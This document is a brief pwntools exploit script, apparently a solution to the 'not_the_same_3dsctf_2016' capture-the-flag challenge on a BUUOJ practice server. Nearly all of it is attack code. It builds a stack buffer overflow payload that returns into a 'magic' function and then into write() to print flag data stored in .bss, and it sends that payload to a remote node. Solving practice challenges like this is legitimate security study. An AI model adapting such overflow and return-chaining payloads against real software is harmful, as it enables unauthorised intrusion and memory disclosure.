from pwn import *

context(log_level='debug', arch='i386', os='linux')
sl = lambda x: io.sendline(x)

# io = process('not_the_same_3dsctf_2016')
io=remote('node4.buuoj.cn',25445)
elf = ELF('./not_the_same_3dsctf_2016')

bss = 0x080eca2d  # ida能看到fget写到这个地址了, 直接write输出
magic = 0x80489a0
write = elf.sym['write']

payload = flat(b'a' * 0x2d, magic, write, bss, 1, bss, 42)
sl(payload)

io.interactive()
